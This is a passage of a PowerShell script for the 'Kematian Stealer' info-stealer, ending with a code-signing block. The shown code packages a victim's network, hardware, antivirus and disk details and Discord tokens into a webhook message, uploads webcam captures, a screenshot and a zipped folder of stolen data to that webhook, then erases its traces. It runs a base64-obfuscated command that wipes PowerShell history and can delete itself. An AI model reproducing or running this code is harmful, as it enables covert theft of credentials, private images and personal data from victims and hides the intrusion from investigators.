        "color"      = "15105570"
        "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
        "url"        = "https://discord.com/invite/WJCNUpxnrE"
        "embeds"     = @(
            @{
                "title"       = "Kematian Stealer"
                "url"         = "https://github.com/Somali-Devs/Kematian-Stealer"
                "description" = "New victim info collected !"
                "color"       = "15105570"
                "footer"      = @{
                    "text" = "Made by Kdot, Chainski and EvilByteCode"
                }
                "thumbnail"   = @{
                    "url" = "https://i.imgur.com/6w6qWCB.jpeg"
                }
                "fields"      = @(
                    @{
                        "name"  = ":satellite: Network"
                        "value" = "``````$networkinfo``````"
                    },
                    @{
                        "name"  = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name"  = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name"  = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name"  = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    },
                    @{
                        "name"  = ":file_folder: Kematian File Info"
                        "value" = "``````$kematainwebhook``````"
                    },
                    @{
                        "name"  = ":key: Discord Token(s)"
                        "value" = "```````n$discord_tokens``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
    
    # Send webcam
    
    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
    foreach ($item in $items) { $name = $item.Name; Move-Item "$($item.FullName)" $folder_general -Force }
    $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
    foreach ($jpegfile in $jpegfiles) {
        $name = $jpegfile.Name
        $messageContent = @{content = "## :camera: Webcam" ; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
        $multipartContent = [Net.Http.MultipartFormDataContent]::new()
        $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
        $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0; $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
        $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json"); $multipartContent.Add($streamContent, "payload_json")
        $fileStream = [IO.File]::OpenRead("$folder_general\$name"); $fileContent = [Net.Http.StreamContent]::new($fileStream)
        $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png"); $multipartContent.Add($fileContent, "file", "$folder_general\$name")
        $httpClient.PostAsync($webhook, $multipartContent).Result
    }

    # Send screenshot
    $messageContent = @{content = "## :desktop: Screenshot"; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
    $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new()
    $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
    $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
    $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
    $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
    $multipartContent.Add($streamContent, "payload_json"); $fileStream = [IO.File]::OpenRead("$folder_general\screenshot.png")
    $fileContent = [Net.Http.StreamContent]::new($fileStream); $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
    $multipartContent.Add($fileContent, "file", "screenshot.png"); $httpClient.PostAsync($webhook, $multipartContent).Result

    # Send exfiltrated data
    $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"; Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
    $messageContent = @{username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
    $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new(); $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
    $messageContentStream = [IO.MemoryStream]::new(); $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
    $streamContent = [Net.Http.StreamContent]::new($messageContentStream); $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
    $multipartContent.Add($streamContent, "payload_json"); $fileStream = [IO.File]::OpenRead($zipFilePath)
    $fileContent = [Net.Http.StreamContent]::new($fileStream); $multipartContent.Add($fileContent, "file", $zipFilePath); $httpClient.PostAsync($webhook, $multipartContent).Result

    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green

    # cleanup
    Remove-Item "$zipFilePath" -Force
    Remove-Item "$env:appdata\Kematian" -Force -Recurse
}

if (CHECK_AND_PATCH -eq $true) {
    VMPROTECT
    KDMUTEX
    if (!($debug)) {
        [ProcessUtility]::MakeProcessKillable()
    }
    $script:SingleInstanceEvent.Close()
    $script:SingleInstanceEvent.Dispose()
    #removes history
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
    if ($debug) {
        Read-Host -Prompt "Press Enter to continue"
    }
    if ($melt) { 
        try {
            Remove-Item $pscommandpath -force
        }
        catch {}
    }
}
else {
    Write-Host "[!] Please run as admin !" -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIWmQYJKoZIhvcNAQcCoIIWijCCFoYCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUwjbe0ttTl6gqbg5Q/36/X6gc
# bI2gghDpMIIC/DCCAeSgAwIBAgIQU0yTE0EQ2qlL3+exBjSgDDANBgkqhkiG9w0B
# AQsFADAWMRQwEgYDVQQDDAtTb21hbGkgRGV2czAeFw0yNDA2MTcxNDQ5MjRaFw0z
# NDA2MTcxNDU5MjNaMBYxFDASBgNVBAMMC1NvbWFsaSBEZXZzMIIBIjANBgkqhkiG
# 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq6xuIobOy3sSDOXqvaVGiVr8bFwIsMYtuUWy
# 3IMYxzmEE4HPG5jPleAuDiwjrkIDiS9M95TOXB3/LR2DrrjECD2I7BeUHofisUAA
# stAME8jWuow3f0f3qQBWyOwkh7PlaFHImOIFXzF3JjHi2eT/F9QcASUjUar9E57I
# QEzNS+bj3wdbHpBgSmHH04YbuYmRMUUX/UCclD4Oi3im7xo/sXDDvxGrp5rvXN20
# BbHzQz0YR+4u8BkFLqMe5fBlv0QPgA/VfmKwvYZSQIVabPjpmPUuJ80l5DKc2M5U
# sI2XKUTgJ0WtyFNrxkSJxXMWmGSpNttNzcT/FgHQT6B1n2fVbQIDAQABo0YwRDAO
# BgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwHQYDVR0OBBYEFEbh
# 1BgcTXFErAEtghDKey9y8d13MA0GCSqGSIb3DQEBCwUAA4IBAQAKKji21j0Ec/5J
# bbyIzW/y1yL8Zfhx2nlzOkDlRX9k9/tExMB+CrKgbkQcrw1X06Ol5pXefmXqe1a2
# YrsAqarngWBbQAmnS4IQbppq2N8d2Wcezcp+zG0l4z6Y++9/QLQToBB62TeL4+IL
# LTVuMrFBHcEvDlxyfPFXNGHDu2jypjUX5QZYV6uD899nM883P+obiMURtWsf0fX+
# 8d0Iyy0vj+esixDkI7xr8kW1CiUOjCEUar3WYwjOL/f1te/RuwhaRWCDQUtsZpcB
# 412+If/yI0wsVInDqkH6hhjOTWV/a4awhQ7r2LIFeSCLGD38crSpmFaoDLpG9dru
# TgwLu3ZsMIIG7DCCBNSgAwIBAgIQMA9vrN1mmHR8qUY2p3gtuTANBgkqhkiG9w0B
# AQwFADCBiDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCk5ldyBKZXJzZXkxFDASBgNV
# BAcTC0plcnNleSBDaXR5MR4wHAYDVQQKExVUaGUgVVNFUlRSVVNUIE5ldHdvcmsx
# LjAsBgNVBAMTJVVTRVJUcnVzdCBSU0EgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkw
# HhcNMTkwNTAyMDAwMDAwWhcNMzgwMTE4MjM1OTU5WjB9MQswCQYDVQQGEwJHQjEb
# MBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRgw
# FgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNBIFRp
# bWUgU3RhbXBpbmcgQ0EwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDI
# GwGv2Sx+iJl9AZg/IJC9nIAhVJO5z6A+U++zWsB21hoEpc5Hg7XrxMxJNMvzRWW5
# +adkFiYJ+9UyUnkuyWPCE5u2hj8BBZJmbyGr1XEQeYf0RirNxFrJ29ddSU1yVg/c
# yeNTmDoqHvzOWEnTv/M5u7mkI0Ks0BXDf56iXNc48RaycNOjxN+zxXKsLgp3/A2U
# Urf8H5VzJD0BKLwPDU+zkQGObp0ndVXRFzs0IXuXAZSvf4DP0REKV4TJf1bgvUac
# gr6Unb+0ILBgfrhN9Q0/29DqhYyKVnHRLZRMyIw80xSinL0m/9NTIMdgaZtYClT0
# Bef9Maz5yIUXx7gpGaQpL0bj3duRX58/Nj4OMGcrRrc1r5a+2kxgzKi7nw0U1BjE
# MJh0giHPYla1IXMSHv2qyghYh3ekFesZVf/QOVQtJu5FGjpvzdeE8NfwKMVPZIMC
# 1Pvi3vG8Aij0bdonigbSlofe6GsO8Ft96XZpkyAcSpcsdxkrk5WYnJee647BeFbG
# RCXfBhKaBi2fA179g6JTZ8qx+o2hZMmIklnLqEbAyfKm/31X2xJ2+opBJNQb/HKl
# FKLUrUMcpEmLQTkUAx4p+hulIq6lw02C0I3aa7fb9xhAV3PwcaP7Sn1FNsH3jYL6
# uckNU4B9+rY5WDLvbxhQiddPnTO9GrWdod6VQXqngwIDAQABo4IBWjCCAVYwHwYD
# VR0jBBgwFoAUU3m/WqorSs9UgOHYm8Cd8rIDZsswHQYDVR0OBBYEFBqh+GEZIA/D
# QXdFKI7RNV8GEgRVMA4GA1UdDwEB/wQEAwIBhjASBgNVHRMBAf8ECDAGAQH/AgEA
# MBMGA1UdJQQMMAoGCCsGAQUFBwMIMBEGA1UdIAQKMAgwBgYEVR0gADBQBgNVHR8E
# STBHMEWgQ6BBhj9odHRwOi8vY3JsLnVzZXJ0cnVzdC5jb20vVVNFUlRydXN0UlNB
# Q2VydGlmaWNhdGlvbkF1dGhvcml0eS5jcmwwdgYIKwYBBQUHAQEEajBoMD8GCCsG
# AQUFBzAChjNodHRwOi8vY3J0LnVzZXJ0cnVzdC5jb20vVVNFUlRydXN0UlNBQWRk
# VHJ1c3RDQS5jcnQwJQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnVzZXJ0cnVzdC5j
# b20wDQYJKoZIhvcNAQEMBQADggIBAG1UgaUzXRbhtVOBkXXfA3oyCy0lhBGysNsq
# fSoF9bw7J/RaoLlJWZApbGHLtVDb4n35nwDvQMOt0+LkVvlYQc/xQuUQff+wdB+P
# xlwJ+TNe6qAcJlhc87QRD9XVw+K81Vh4v0h24URnbY+wQxAPjeT5OGK/EwHFhaNM
# xcyyUzCVpNb0llYIuM1cfwGWvnJSajtCN3wWeDmTk5SbsdyybUFtZ83Jb5A9f0Vy
# wRsj1sJVhGbks8VmBvbz1kteraMrQoohkv6ob1olcGKBc2NeoLvY3NdK0z2vgwY4
# Eh0khy3k/ALWPncEvAQ2ted3y5wujSMYuaPCRx3wXdahc1cFaJqnyTdlHb7qvNhC
# g0MFpYumCf/RoZSmTqo9CfUFbLfSZFrYKiLCS53xOV5M3kg9mzSWmglfjv33sVKR
# zj+J9hyhtal1H3G/W0NdZT1QgW6r8NDT/LKzH7aZlib0PHmLXGTMze4nmuWgwAxy
# h8FuTVrTHurwROYybxzrF06Uw3hlIDsPQaof6aFBnf6xuKBlKjTg3qj5PObBMLvA
# oGMs/FwWAKjQxH/qEZ0eBsambTJdtDgJK0kHqv3sMNrxpy/Pt/360KOE2See+wFm
# d7lWEOEgbsausfm2usg1XTN2jvF8IAwqd661ogKGuinutFoAsYyr4/kKyVRd1Llq
# dJ69SK6YMIIG9TCCBN2gAwIBAgIQOUwl4XygbSeoZeI72R0i1DANBgkqhkiG9w0B
# AQwFADB9MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVy
# MRAwDgYDVQQHEwdTYWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAj
# BgNVBAMTHFNlY3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgQ0EwHhcNMjMwNTAzMDAw
# MDAwWhcNMzQwODAyMjM1OTU5WjBqMQswCQYDVQQGEwJHQjETMBEGA1UECBMKTWFu
# Y2hlc3RlcjEYMBYGA1UEChMPU2VjdGlnbyBMaW1pdGVkMSwwKgYDVQQDDCNTZWN0
# aWdvIFJTQSBUaW1lIFN0YW1waW5nIFNpZ25lciAjNDCCAiIwDQYJKoZIhvcNAQEB
# BQADggIPADCCAgoCggIBAKSTKFJLzyeHdqQpHJk4wOcO1NEc7GjLAWTkis13sHFl
# gryf/Iu7u5WY+yURjlqICWYRFFiyuiJb5vYy8V0twHqiDuDgVmTtoeWBIHIgZEFs
# x8MI+vN9Xe8hmsJ+1yzDuhGYHvzTIAhCs1+/f4hYMqsws9iMepZKGRNcrPznq+kc
# Fi6wsDiVSs+FUKtnAyWhuzjpD2+pWpqRKBM1uR/zPeEkyGuxmegN77tN5T2MVAOR
# 0Pwtz1UzOHoJHAfRIuBjhqe+/dKDcxIUm5pMCUa9NLzhS1B7cuBb/Rm7HzxqGXtu
# uy1EKr48TMysigSTxleGoHM2K4GX+hubfoiH2FJ5if5udzfXu1Cf+hglTxPyXnyp
# sSBaKaujQod34PRMAkjdWKVTpqOg7RmWZRUpxe0zMCXmloOBmvZgZpBYB4DNQnWs
# +7SR0MXdAUBqtqgQ7vaNereeda/TpUsYoQyfV7BeJUeRdM11EtGcb+ReDZvsdSbu
# /tP1ki9ShejaRFEqoswAyodmQ6MbAO+itZadYq0nC/IbSsnDlEI3iCCEqIeuw7oj
# cnv4VO/4ayewhfWnQ4XYKzl021p3AtGk+vXNnD3MH65R0Hts2B0tEUJTcXTC5TWq
# LVIS2SXP8NPQkUMS1zJ9mGzjd0HI/x8kVO9urcY+VXvxXIc6ZPFgSwVP77kv7AkT
# AgMBAAGjggGCMIIBfjAfBgNVHSMEGDAWgBQaofhhGSAPw0F3RSiO0TVfBhIEVTAd
# BgNVHQ4EFgQUAw8xyJEqk71j89FdTaQ0D9KVARgwDgYDVR0PAQH/BAQDAgbAMAwG
# A1UdEwEB/wQCMAAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwSgYDVR0gBEMwQTA1
# BgwrBgEEAbIxAQIBAwgwJTAjBggrBgEFBQcCARYXaHR0cHM6Ly9zZWN0aWdvLmNv
# bS9DUFMwCAYGZ4EMAQQCMEQGA1UdHwQ9MDswOaA3oDWGM2h0dHA6Ly9jcmwuc2Vj
# dGlnby5jb20vU2VjdGlnb1JTQVRpbWVTdGFtcGluZ0NBLmNybDB0BggrBgEFBQcB
# AQRoMGYwPwYIKwYBBQUHMAKGM2h0dHA6Ly9jcnQuc2VjdGlnby5jb20vU2VjdGln
# b1JTQVRpbWVTdGFtcGluZ0NBLmNydDAjBggrBgEFBQcwAYYXaHR0cDovL29jc3Au
# c2VjdGlnby5jb20wDQYJKoZIhvcNAQEMBQADggIBAEybZVj64HnP7xXDMm3eM5Hr
# d1ji673LSjx13n6UbcMixwSV32VpYRMM9gye9YkgXsGHxwMkysel8Cbf+PgxZQ3g
# 621RV6aMhFIIRhwqwt7y2opF87739i7Efu347Wi/elZI6WHlmjl3vL66kWSIdf9d
# hRY0J9Ipy//tLdr/vpMM7G2iDczD8W69IZEaIwBSrZfUYngqhHmo1z2sIY9wwyR5
# OpfxDaOjW1PYqwC6WPs1gE9fKHFsGV7Cg3KQruDG2PKZ++q0kmV8B3w1RB2tWBhr
# YvvebMQKqWzTIUZw3C+NdUwjwkHQepY7w0vdzZImdHZcN6CaJJ5OX07Tjw/lE09Z
# RGVLQ2TPSPhnZ7lNv8wNsTow0KE9SK16ZeTs3+AB8LMqSjmswaT5qX010DJAoLEZ
# Khghssh9BXEaSyc2quCYHIN158d+S4RDzUP7kJd2KhKsQMFwW5kKQPqAbZRhe8hu
# uchnZyRcUI0BIN4H9wHU+C4RzZ2D5fjKJRxEPSflsIZHKgsbhHZ9e2hPjbf3E7Tt
# oC3ucw/ZELqdmSx813UfjxDElOZ+JOWVSoiMJ9aFZh35rmR2kehI/shVCu0pwx/e
# OKbAFPsyPfipg2I2yMO+AIccq/pKQhyJA9z1XHxw2V14Tu6fXiDmCWp8KwijSPUV
# /ARP380hHHrl9Y4a1LlAMYIFGjCCBRYCAQEwKjAWMRQwEgYDVQQDDAtTb21hbGkg
# RGV2cwIQU0yTE0EQ2qlL3+exBjSgDDAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIB
# DDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEE
# AYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU+FcXN6xT6tGx
# AcLe1hD50jThvLIwDQYJKoZIhvcNAQEBBQAEggEAWnMN13VlZ2LAKE2t4BpEIA2G
# 8/KsG4ijK54Xw0+9Vf+Jx6q96PbvvQP/q/OB3UOLyBvvOmRuR6wp4H+ZO33UwfX5
# Qoy2zoB1KWk7ExKoaUIjcygL2Wtx3GjOnbFnzvnMOgCxlocmqbF7tLG8Uh52a6wd
# K94qAA6eA1eFHsbMUbav/X0QNXJVSXziDglYeberP5FAlEK1/adT2Z65Qh56szk0
# FFah2aS6fFlai8SwT8AB0ITYHvyU5pm5JfH5+pHR148HuhDRmvZoM0xb4/OM1huu
# cXYi+ZmrwisHmgf68M3QdgcPALzLOGOeU9mJQV1/AFta8J4dKDUfOYxB1XWjvKGC
# A0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYDVQQGEwJHQjEb
# MBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRgw
# FgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNBIFRp
# bWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZIAWUDBAICBQCg
# eTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0yNDA2
# MTcxNDU5MjhaMD8GCSqGSIb3DQEJBDEyBDBGRLJAapPRNolz+zJyreQA0q+u/fa1
# a7LHOtxhHcCooXIxhKJXK6HJL2LckM+Rx7UwDQYJKoZIhvcNAQEBBQAEggIAjaym
# W4mE0lpq3bPTRWKnki0yBHRwQlQi+YCco1nxQG21XZeKRx49/F9BgIFoY7BHaAx6
# /g9+W3DdxeT2tl0Dz/MOtVCBpLmxncjijT/ug6Rd9UieMvyCqSmH6o/sC8Xun+Xb
# dvxuWy9EC7JqsxH7w8PKV34iyNb6RgQe5PU8Pns7/Es6mxRKaHLzjRsMSotTAV+N
# 90k91Zy6UzJOpyAyulic8n1NYIpJANnALrl0XZuLuZfbFwFohG4lzi5QrEE1Zg9W
# jRU2lyGMIH2Dujld7POzX4oYnhUhDnaJf3GK89yyY8kOlnEYfJ67bgE3Y+PZD4dX
# I4hFeX7wceGow4VVMYODnRSkNwLqsBif3hAdRqUZkmkKmapHEaBAzBIIhsnU025d
# XCb/8pFdTj8J5e1A+ISaza2XcWPpTZ4/XlEP9iZTTGIf/e15ZwlO6zpViSpq1U+y
# LENUR1GvVQQeaz093V55bB7MUyn5MFdVlKFMFHq6mQxUgvCp9MXawy6DOFVEpZo9
# Q688IKAtFrIOLlMehx9VL9FsND6hS/NerGTdE6Tt60fCngXXFaZ/Z9ngeqdjzz6k
# ktf6Y2jI/bIHyA9EjRHX27j8czH48622HXjc+7fmGeEpqDrrA5Jvty4cey0K1DQn
# XFPQ9XF03PeCkc2meyVMDrRwW2z5lsK72HwEg/s=
# SIG # End signature block
